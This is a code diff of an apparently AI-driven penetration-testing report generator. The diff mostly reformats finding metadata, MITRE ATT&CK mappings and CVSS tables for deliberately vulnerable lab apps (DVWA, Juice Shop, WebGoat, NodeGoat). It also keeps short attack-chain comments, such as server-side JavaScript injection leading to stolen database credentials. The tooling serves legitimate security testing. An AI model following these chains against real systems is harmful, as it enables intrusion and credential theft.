+            technique_name="Data from Cloud Storage",
+        ),
         references=[
             Reference(
                 title="OWASP A01:2021 – Broken Access Control (IDOR)",
@@ -3099,7 +3220,6 @@ NODEGOAT_FINDINGS: list[Finding] = [
             ),
         ],
     ),
-
     # ---- 4. Server-Side JavaScript Injection (SSJI) ----
     Finding(
         id="NG-007",
@@ -3223,7 +3343,12 @@ NODEGOAT_FINDINGS: list[Finding] = [
                 ),
             ),
         ],
-        mitre_attack=MitreAttack(tactic_id="TA0002", tactic_name="Execution", technique_id="T1059.007", technique_name="JavaScript"),
+        mitre_attack=MitreAttack(
+            tactic_id="TA0002",
+            tactic_name="Execution",
+            technique_id="T1059.007",
+            technique_name="JavaScript",
+        ),
         references=[
             Reference(
                 title="OWASP A03:2021 – Injection (SSJI)",
@@ -3231,7 +3356,6 @@ NODEGOAT_FINDINGS: list[Finding] = [
             ),
         ],
     ),
-
     # ---- 5. User Enumeration ----
     Finding(
         id="NG-003",
@@ -3330,7 +3454,12 @@ NODEGOAT_FINDINGS: list[Finding] = [
                 ),
             ),
         ],
-        mitre_attack=MitreAttack(tactic_id="TA0043", tactic_name="Reconnaissance", technique_id="T1589.001", technique_name="Gather Victim Identity Information"),
+        mitre_attack=MitreAttack(
+            tactic_id="TA0043",
+            tactic_name="Reconnaissance",
+            technique_id="T1589.001",
+            technique_name="Gather Victim Identity Information",
+        ),
         references=[
             Reference(
                 title="OWASP A07:2021 – Identification and Authentication Failures",
@@ -3338,7 +3467,6 @@ NODEGOAT_FINDINGS: list[Finding] = [
             ),
         ],
     ),
-
     # ---- 6. Insecure Session Cookie ----
     Finding(
         id="NG-004",
@@ -3435,7 +3563,12 @@ NODEGOAT_FINDINGS: list[Finding] = [
                 ),
             ),
         ],
-        mitre_attack=MitreAttack(tactic_id="TA0006", tactic_name="Credential Access", technique_id="T1539", technique_name="Steal Web Session Cookie"),
+        mitre_attack=MitreAttack(
+            tactic_id="TA0006",
+            tactic_name="Credential Access",
+            technique_id="T1539",
+            technique_name="Steal Web Session Cookie",
+        ),
         references=[
             Reference(
                 title="OWASP A02:2021 – Cryptographic Failures (Session Cookies)",
@@ -3443,7 +3576,6 @@ NODEGOAT_FINDINGS: list[Finding] = [
             ),
         ],
     ),
-
     # ---- 7. Missing Security Headers ----
     Finding(
         id="NG-005",
@@ -3554,7 +3686,12 @@ NODEGOAT_FINDINGS: list[Finding] = [
                 ),
             ),
         ],
-        mitre_attack=MitreAttack(tactic_id="TA0004", tactic_name="Privilege Escalation", technique_id="T1185", technique_name="Browser Session Hijacking"),
+        mitre_attack=MitreAttack(
+            tactic_id="TA0004",
+            tactic_name="Privilege Escalation",
+            technique_id="T1185",
+            technique_name="Browser Session Hijacking",
+        ),
         references=[
             Reference(
                 title="OWASP A05:2021 – Security Misconfiguration",
@@ -3562,7 +3699,6 @@ NODEGOAT_FINDINGS: list[Finding] = [
             ),
         ],
     ),
-
     # ---- 8. Technology Disclosure ----
     Finding(
         id="NG-008",
@@ -3637,7 +3773,12 @@ NODEGOAT_FINDINGS: list[Finding] = [
                 ),
             ),
         ],
-        mitre_attack=MitreAttack(tactic_id="TA0043", tactic_name="Reconnaissance", technique_id="T1592.002", technique_name="Gather Victim Host Information: Software"),
+        mitre_attack=MitreAttack(
+            tactic_id="TA0043",
+            tactic_name="Reconnaissance",
+            technique_id="T1592.002",
+            technique_name="Gather Victim Host Information: Software",
+        ),
         references=[
             Reference(
                 title="OWASP A05:2021 – Security Misconfiguration",
@@ -3678,109 +3819,11 @@ NODEGOAT_EXECUTIVE_SUMMARY = (
 )
 
 NODEGOAT_ATTACK_CHAINS = [
-    ["NG-006", "NG-002"],   # Default creds → admin login → IDOR all users
-    ["NG-001", "NG-003"],   # CSRF bypass + user enumeration → account takeover
-    ["NG-007", "NG-006"],   # SSJI → process.env → DB creds → all passwords
-    ["NG-004", "NG-001"],   # Insecure cookie → CSRF amplification → session hijack
+    ["NG-006", "NG-002"],  # Default creds → admin login → IDOR all users
+    ["NG-001", "NG-003"],  # CSRF bypass + user enumeration → account takeover
+    ["NG-007", "NG-006"],  # SSJI → process.env → DB creds → all passwords
+    ["NG-004", "NG-001"],  # Insecure cookie → CSRF amplification → session hijack
 ]
-
-
-# =====================================================================
-# MAIN
-# =====================================================================
-
-def main() -> None:
-    gen = ReportGenerator()
-    reports_dir = Path(__file__).parent / "reports"
-    reports_dir.mkdir(parents=True, exist_ok=True)
-
-    # --- DVWA Report ---
-    dvwa_data = ReportData(
-        scan_id="dvwa-bench-20260330",
-        client_name="DVWA (Damn Vulnerable Web Application)",
-        target="http://localhost:8080",
-        scan_date="2026-03-30",
-        findings=DVWA_FINDINGS,
-        company_name="VXIS Security",
-        author="VXIS Autonomous Brain",
-        executive_summary=DVWA_EXECUTIVE_SUMMARY,
-        attack_chains=DVWA_ATTACK_CHAINS,
-    )
-
-    dvwa_path = gen.generate_html_file(
-        dvwa_data,
-        reports_dir / "report_dvwa_20260330.html",
-    )
-    print(f"[OK] DVWA report: {dvwa_path}")
-    print(f"     Findings: {dvwa_data.total_findings}")
-    print(f"     Severity: {dvwa_data.severity_counts}")
-    print(f"     Risk Score: {dvwa_data.risk_score}/10")
-
-    # --- Juice Shop Report ---
-    juice_data = ReportData(
-        scan_id="juice-bench-20260330",
-        client_name="OWASP Juice Shop",
-        target="http://localhost:3000",
-        scan_date="2026-03-30",
-        findings=JUICE_SHOP_FINDINGS,
-        company_name="VXIS Security",
-        author="VXIS Autonomous Brain",
-        executive_summary=JUICE_SHOP_EXECUTIVE_SUMMARY,
-        attack_chains=JUICE_SHOP_ATTACK_CHAINS,
-    )
-
-    juice_path = gen.generate_html_file(
-        juice_data,
-        reports_dir / "report_juice_shop_20260330.html",
-    )
-    print(f"\n[OK] Juice Shop report: {juice_path}")
-    print(f"     Findings: {juice_data.total_findings}")
-    print(f"     Severity: {juice_data.severity_counts}")
-    print(f"     Risk Score: {juice_data.risk_score}/10")
-
-    # --- WebGoat Report ---
-    webgoat_data = ReportData(
-        scan_id="webgoat-2026-03-31",
-        client_name="OWASP WebGoat 8.2 — VXIS Autonomous Scan",
-        target="http://localhost:8080/WebGoat",
-        scan_date="2026-03-31",
-        findings=WEBGOAT_FINDINGS,
-        company_name="VXIS Security",
-        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
-        executive_summary=WEBGOAT_EXECUTIVE_SUMMARY,
-        attack_chains=WEBGOAT_ATTACK_CHAINS,
-    )
-
-    webgoat_path = gen.generate_html_file(
-        webgoat_data,
-        reports_dir / "report_webgoat_20260331.html",
-    )
-    print(f"\n[OK] WebGoat report: {webgoat_path}")
-    print(f"     Findings: {webgoat_data.total_findings}")
-    print(f"     Severity: {webgoat_data.severity_counts}")
-    print(f"     Risk Score: {webgoat_data.risk_score}/10")
-
-    # --- NodeGoat Report ---
-    nodegoat_data = ReportData(
-        scan_id="nodegoat-2026-03-31",
-        client_name="OWASP NodeGoat (Node.js/Express/MongoDB)",
-        target="http://localhost:4000",
-        scan_date="2026-03-31",
-        findings=NODEGOAT_FINDINGS,
-        company_name="VXIS Security",
-        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
-        executive_summary=NODEGOAT_EXECUTIVE_SUMMARY,
-        attack_chains=NODEGOAT_ATTACK_CHAINS,
-    )
-
-    nodegoat_path = gen.generate_html_file(
-        nodegoat_data,
-        reports_dir / "report_nodegoat_20260331.html",
-    )
-    print(f"\n[OK] NodeGoat report: {nodegoat_path}")
-    print(f"     Findings: {nodegoat_data.total_findings}")
-    print(f"     Severity: {nodegoat_data.severity_counts}")
-    print(f"     Risk Score: {nodegoat_data.risk_score}/10")
 
 
 # =====================================================================
@@ -3790,83 +3833,115 @@ def main() -> None:
 # Finding type → CVSS / CWE / MITRE heuristic table
 _FINDING_META: dict[str, dict] = {
     "sql_injection": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": 9.8,
-        "cwe": ["CWE-89"], "severity": "critical",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8,
+        "cwe": ["CWE-89"],
+        "severity": "critical",
         "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
     },
     "xss": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "score": 6.1,
-        "cwe": ["CWE-79"], "severity": "medium",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "score": 6.1,
+        "cwe": ["CWE-79"],
+        "severity": "medium",
         "mitre": ("TA0009", "Collection", "T1185", "Browser Session Hijacking"),
     },
     "command_injection": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "score": 8.8,
-        "cwe": ["CWE-78"], "severity": "critical",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.8,
+        "cwe": ["CWE-78"],
+        "severity": "critical",
         "mitre": ("TA0002", "Execution", "T1059", "Command and Scripting Interpreter"),
     },
     "ssrf": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", "score": 8.6,
-        "cwe": ["CWE-918"], "severity": "high",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+        "score": 8.6,
+        "cwe": ["CWE-918"],
+        "severity": "high",
         "mitre": ("TA0009", "Collection", "T1090", "Proxy"),
     },
     "csrf": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", "score": 6.5,
-        "cwe": ["CWE-352"], "severity": "medium",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+        "score": 6.5,
+        "cwe": ["CWE-352"],
+        "severity": "medium",
         "mitre": ("TA0009", "Collection", "T1185", "Browser Session Hijacking"),
     },
     "idor": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N", "score": 7.1,
-        "cwe": ["CWE-639"], "severity": "high",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+        "score": 7.1,
+        "cwe": ["CWE-639"],
+        "severity": "high",
         "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
     },
     "path_traversal": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "score": 7.5,
-        "cwe": ["CWE-22"], "severity": "high",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5,
+        "cwe": ["CWE-22"],
+        "severity": "high",
         "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
     },
     "ssti": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": 9.8,
-        "cwe": ["CWE-1336"], "severity": "critical",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8,
+        "cwe": ["CWE-1336"],
+        "severity": "critical",
         "mitre": ("TA0002", "Execution", "T1059", "Command and Scripting Interpreter"),
     },
     "nosql_injection": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "score": 9.1,
-        "cwe": ["CWE-943"], "severity": "critical",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "score": 9.1,
+        "cwe": ["CWE-943"],
+        "severity": "critical",
         "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
     },
     "broken_authentication": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": 9.8,
-        "cwe": ["CWE-287"], "severity": "critical",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8,
+        "cwe": ["CWE-287"],
+        "severity": "critical",
         "mitre": ("TA0006", "Credential Access", "T1110", "Brute Force"),
     },
     "information_disclosure": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "score": 5.3,
-        "cwe": ["CWE-200"], "severity": "medium",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "score": 5.3,
+        "cwe": ["CWE-200"],
+        "severity": "medium",
         "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
     },
     "security_misconfiguration": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "score": 5.3,
-        "cwe": ["CWE-16"], "severity": "informational",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+        "score": 5.3,
+        "cwe": ["CWE-16"],
+        "severity": "informational",
         "mitre": None,
     },
     "cors_misconfiguration": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", "score": 6.5,
-        "cwe": ["CWE-942"], "severity": "medium",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+        "score": 6.5,
+        "cwe": ["CWE-942"],
+        "severity": "medium",
         "mitre": ("TA0009", "Collection", "T1185", "Browser Session Hijacking"),
     },
     "mass_assignment": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "score": 8.1,
-        "cwe": ["CWE-915"], "severity": "high",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "score": 8.1,
+        "cwe": ["CWE-915"],
+        "severity": "high",
         "mitre": ("TA0004", "Privilege Escalation", "T1548", "Abuse Elevation Control Mechanism"),
     },
     "file_upload": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "score": 8.8,
-        "cwe": ["CWE-434"], "severity": "critical",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.8,
+        "cwe": ["CWE-434"],
+        "severity": "critical",
         "mitre": ("TA0002", "Execution", "T1505", "Server Software Component"),
     },
     "forced_browsing": {
-        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:M/I:N/A:N", "score": 5.3,
-        "cwe": ["CWE-425"], "severity": "medium",
+        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:M/I:N/A:N",
+        "score": 5.3,
+        "cwe": ["CWE-425"],
+        "severity": "medium",
         "mitre": ("TA0007", "Discovery", "T1083", "File and Directory Discovery"),
     },
 }
@@ -3973,8 +4048,10 @@ def _enrich_finding(f: Finding) -> Finding:
     if meta.get("mitre") and not f.mitre_attack:
         ta_id, ta_name, t_id, t_name = meta["mitre"]
         f.mitre_attack = MitreAttack(
-            tactic_id=ta_id, tactic_name=ta_name,
-            technique_id=t_id, technique_name=t_name,
+            tactic_id=ta_id,
+            tactic_name=ta_name,
+            technique_id=t_id,
+            technique_name=t_name,
         )
 
     # 2. NCC-style description (템플릿 기반, LLM 불필요)
@@ -4031,11 +4108,13 @@ def _enrich_finding(f: Finding) -> Finding:
 
     # 4. Evidence — raw description을 evidence로 추가
     if not f.evidence:
-        f.evidence = [Evidence(
-            evidence_type="log",
-            title=f"Scanner Detection — {ftype}",
-            content=f"Finding detected at {endpoint}\n{(f.description or '')[:500]}",
-        )]
+        f.evidence = [
+            Evidence(
+                evidence_type="log",
+                title=f"Scanner Detection — {ftype}",
+                content=f"Finding detected at {endpoint}\n{(f.description or '')[:500]}",
+            )
+        ]
 
     return f
 
@@ -4057,13 +4136,15 @@ def run_live_scan_and_report(
         os.environ["OPENAI_API_KEY"] = os.environ["LLM_API_KEY"]
 
     from vxis.agent.brain import AgentBrain
-    from vxis.pipeline.pipeline import ScanPipeline
+    from vxis.pipeline import ScanPipeline
     from vxis.report.generator import ReportData, ReportGenerator
 
     brain = AgentBrain()
     pipeline = ScanPipeline(brain=brain)
 
-    _scan_id = scan_id or f"live-{target_name}-{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}"
+    _scan_id = (
+        scan_id or f"live-{target_name}-{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}"
+    )
 
     print(f"\n  [SCAN] {target_name} — {target_url}")
 
@@ -4102,12 +4183,15 @@ def run_live_scan_and_report(
         crit = sum(1 for f in enriched if str(f.severity) in ("critical", "Severity.critical"))
         high = sum(1 for f in enriched if str(f.severity) in ("high", "Severity.high"))
         try:
-            exec_summary = brain._call_llm_with_fallback(
-                "Write a concise executive summary for a penetration test report. English|||Korean format.",
-                f"Target: {target_url}\nFindings: {len(enriched)} total, {crit} critical, {high} high.\n"
-                f"Finding types: {list(set(f.finding_type for f in enriched))}.\n"
-                f"Write a 3-4 sentence executive summary.",
-            ) or ""
+            exec_summary = (
+                brain._call_llm_with_fallback(
+                    "Write a concise executive summary for a penetration test report. English|||Korean format.",
+                    f"Target: {target_url}\nFindings: {len(enriched)} total, {crit} critical, {high} high.\n"
+                    f"Finding types: {list(set(f.finding_type for f in enriched))}.\n"
+                    f"Write a 3-4 sentence executive summary.",
+                )
+                or ""
+            )
         except Exception:
             exec_summary = (
                 f"VXIS autonomous scan of {target_url} identified {len(enriched)} security findings, "
@@ -4141,13 +4225,14 @@ def main_live() -> None:
     reports_dir.mkdir(parents=True, exist_ok=True)
 
     targets = [
-        ("dvwa",       "http://localhost:8081",          "DVWA (Damn Vulnerable Web Application)"),
-        ("juice-shop", "http://localhost:3000",           "OWASP Juice Shop"),
-        ("webgoat",    "http://localhost:8888/WebGoat",  "OWASP WebGoat"),
-        ("nodegoat",   "http://localhost:4000",          "OWASP NodeGoat"),
+        ("dvwa", "http://localhost:8081", "DVWA (Damn Vulnerable Web Application)"),
+        ("juice-shop", "http://localhost:3000", "OWASP Juice Shop"),
+        ("webgoat", "http://localhost:8888/WebGoat", "OWASP WebGoat"),
+        ("nodegoat", "http://localhost:4000", "OWASP NodeGoat"),
     ]
 
     from datetime import datetime, timezone
+
     date_str = datetime.now(timezone.utc).strftime("%Y%m%d")
 
     for name, url, client in targets:
@@ -4161,6 +4246,7 @@ def main_live() -> None:
 
 def main() -> None:
     import sys
+
     if "--live" in sys.argv:
         main_live()
         return
@@ -4211,7 +4297,9 @@ def main() -> None:
         executive_summary=WEBGOAT_EXECUTIVE_SUMMARY,
         attack_chains=WEBGOAT_ATTACK_CHAINS,
     )
-    webgoat_path = gen.generate_html_file(webgoat_data, reports_dir / "report_webgoat_20260331.html")
+    webgoat_path = gen.generate_html_file(
+        webgoat_data, reports_dir / "report_webgoat_20260331.html"
+    )
     print(f"[OK] WebGoat: {webgoat_path} ({webgoat_data.total_findings} findings)")
 
     # --- NodeGoat Report ---
@@ -4226,7 +4314,9 @@ def main() -> None:
         executive_summary=NODEGOAT_EXECUTIVE_SUMMARY,
         attack_chains=NODEGOAT_ATTACK_CHAINS,
     )
-    nodegoat_path = gen.generate_html_file(nodegoat_data, reports_dir / "report_nodegoat_20260331.html")
+    nodegoat_path = gen.generate_html_file(
+        nodegoat_data, reports_dir / "report_nodegoat_20260331.html"
+    )
     print(f"[OK] NodeGoat: {nodegoat_path} ({nodegoat_data.total_findings} findings)")
 
 
